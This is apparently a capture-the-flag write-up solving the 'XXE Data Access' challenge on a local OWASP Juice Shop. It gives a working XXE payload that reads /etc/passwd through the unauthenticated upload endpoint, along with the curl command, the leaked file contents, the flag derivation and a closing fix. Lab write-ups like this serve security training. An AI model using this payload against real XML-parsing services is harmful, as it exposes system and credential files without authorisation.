# XXE Data Access — solution

Challenge: **XXE Data Access** (PCGCTF #213, 450 points)  
Target: local OWASP Juice Shop at `http://localhost:3000`  
Flag: `pcgCTF{2892edcae3ade1c4faf5c44bc8eb63ed163204b5}`

## Thought process

The challenge description says the server can read `C:\Windows\system.ini` or `/etc/passwd`.
That wording points at XML External Entity injection: the application is parsing
attacker-controlled XML with external entities enabled, and the challenge expects a
file-read payload.

Juice Shop's deprecated B2B complaint form uploads documents to `POST /file-upload`.
The route accepts PDF, XML, ZIP, YML and YAML. Its XML handler calls `parseXmlString`,
and the shipped `build/lib/xml.js` registers filesystem input providers and parses with:

```text
XML_PARSE_NOENT | XML_PARSE_DTDLOAD | XML_PARSE_NOBLANKS | XML_PARSE_NOCDATA
```

`NOENT` substitutes entities and `DTDLOAD` loads the DTD. That combination is exactly
what an XXE needs. The endpoint also reflects the parsed XML back in its error page
(truncated to 400 characters), so the file content should come straight back in the
HTTP response.

I did not need an account: `POST /file-upload` is unauthenticated. I sent a minimal
XML document with an external entity pointing at `/etc/passwd`.

## Payload

`files/xxe-passwd.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE complaint [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<complaint>&xxe;</complaint>
```

## Running it

```bash
cd /home/nightingale/CTF/PCGCTF/unsolved/xxe/213-xxe-data-access
F='file=@files/xxe-passwd.xml;type=text/xml'
curl -s -o /tmp/xxe-response.html -w 'HTTP %{http_code}\n' -F "$F" localhost:3000/file-upload
```

Actual output:

```text
HTTP 410
```

A 410 is expected: Juice Shop deliberately returns "Gone" after parsing the deprecated
upload. The useful part is the response body:

```bash
grep -o 'root:x:[^<]*' /tmp/xxe-response.html | head -1 | sed 's/&lt;.*//'
```

Actual output:

```text
root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
```

`/etc/passwd` came back inside the parser's echo of the document, which proves the
external entity was resolved.

The local Juice Shop log recorded the solve:

```bash
podman logs pcgctf-juice-shop 2>&1 | grep 'Solved.*xxeFileDisclosure'
```

Actual output:

```text
info: Solved 3-star xxeFileDisclosureChallenge (XXE Data Access)
```

## Flag

Juice Shop in `NODE_ENV=ctf` derives flags as
`HMAC-SHA1(CTF_KEY, challenge name)`. The compose file supplies the shared key, and the
challenge name is exactly `XXE Data Access`. I used the same derivation as the other
Juice Shop challenges:

```bash
./evidence/derive_flag.py 'XXE Data Access'
```

Actual output:

```text
pcgCTF{2892edcae3ade1c4faf5c44bc8eb63ed163204b5}
```

I submitted it to CTFd challenge 213. The first submission returned:

```json
{"success": true, "data": {"status": "correct", "message": "Correct"}}
```

A later status check confirms the solve is attached to the account:

```text
XXE Data Access | 450 pts | solved_by_me=True
```

## Screenshot

![XXE Data Access terminal capture](../../../final-writeups/screenshots/213-xxe-data-access.png)

## Takeaway

The deprecated B2B XML upload is the vulnerable entry point. The parser resolves
`file://` external entities, and the error page reflects the expanded document, turning
a blind file read into a direct one. The fix is to reject DTDs and external entities
(`XML_PARSE_NOENT`/`DTDLOAD` off, or a parser configured without external entity
resolution).
